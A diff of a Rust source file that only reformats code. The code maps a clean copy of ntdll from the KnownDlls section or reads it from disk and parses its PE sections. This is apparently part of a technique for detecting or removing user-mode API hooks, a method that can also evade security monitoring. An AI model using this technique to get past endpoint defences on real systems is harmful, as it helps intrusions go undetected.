@@ -119,8 +119,7 @@ type NtMapViewOfSection = unsafe extern "system" fn(
     u32,              // Win32Protect (by value, PAGE_READONLY)
 ) -> i32;
 
-type NtUnmapViewOfSection =
-    unsafe extern "system" fn(*mut c_void, *mut c_void) -> i32;
+type NtUnmapViewOfSection = unsafe extern "system" fn(*mut c_void, *mut c_void) -> i32;
 
 // ---- Win32 file-API constants + FFI (disk fallback) ----
 
@@ -153,10 +152,10 @@ type CreateFileW = unsafe extern "system" fn(
 ) -> *mut c_void;
 
 type ReadFile = unsafe extern "system" fn(
-    *mut c_void, // hFile
-    *mut u8,     // lpBuffer
-    u32,         // nNumberOfBytesToRead
-    *mut u32,    // lpNumberOfBytesRead (out)
+    *mut c_void,   // hFile
+    *mut u8,       // lpBuffer
+    u32,           // nNumberOfBytesToRead
+    *mut u32,      // lpNumberOfBytesRead (out)
     *const c_void, // lpOverlapped (NULL → synchronous)
 ) -> i32; // BOOL
 
@@ -220,9 +219,21 @@ pub unsafe fn fresh_ntdll_text() -> Option<(*mut u8, u32, u32)> {
     // KnownDlls object is named "ntdll", and "\KnownDlls\ntdll.dll" FAILS.
     // 14 chars + NUL = 15 wide = 30 bytes (length) / 32 bytes (max).
     let mut path: [u16; 15] = [
-        b'\\' as u16, b'K' as u16, b'n' as u16, b'o' as u16, b'w' as u16, b'n' as u16,
-        b'D' as u16, b'l' as u16, b'l' as u16, b's' as u16, b'\\' as u16,
-        b'n' as u16, b't' as u16, b'd' as u16, b'l' as u16,
+        b'\\' as u16,
+        b'K' as u16,
+        b'n' as u16,
+        b'o' as u16,
+        b'w' as u16,
+        b'n' as u16,
+        b'D' as u16,
+        b'l' as u16,
+        b'l' as u16,
+        b's' as u16,
+        b'\\' as u16,
+        b'n' as u16,
+        b't' as u16,
+        b'd' as u16,
+        b'l' as u16,
     ];
     let mut name = UnicodeStringMut {
         length: (14 * 2) as u16,         // 14 chars, no NUL counted
@@ -385,8 +396,17 @@ unsafe fn read_ntdll_file() -> Option<Vec<u8>> {
 
     // 2. Append "\\ntdll.dll\0". Total must fit in 260 (MAX_PATH-class).
     let suffix: &[u16] = &[
-        b'\\' as u16, b'n' as u16, b't' as u16, b'd' as u16, b'l' as u16, b'l' as u16,
-        b'.' as u16, b'd' as u16, b'l' as u16, b'l' as u16, 0,
+        b'\\' as u16,
+        b'n' as u16,
+        b't' as u16,
+        b'd' as u16,
+        b'l' as u16,
+        b'l' as u16,
+        b'.' as u16,
+        b'd' as u16,
+        b'l' as u16,
+        b'l' as u16,
+        0,
     ];
     if (n as usize) + suffix.len() > sysdir.len() {
         return None;
@@ -515,7 +535,10 @@ unsafe fn section_characteristics(image: &[u8], s: &RawSection) -> Option<u32> {
     let e_lfanew = u32le(image, 0x3C)? as usize;
     let n_sec = u16le(image, e_lfanew + 4 + 2)? as usize;
     let opt_size = u16le(image, e_lfanew + 4 + 16)? as usize;
-    let sec_table = e_lfanew.checked_add(4)?.checked_add(20)?.checked_add(opt_size)?;
+    let sec_table = e_lfanew
+        .checked_add(4)?
+        .checked_add(20)?
+        .checked_add(opt_size)?;
     for i in 0..n_sec {
         let so = sec_table.checked_add(i.checked_mul(40)?)?;
         let va = u32le(image, so + 12)?;
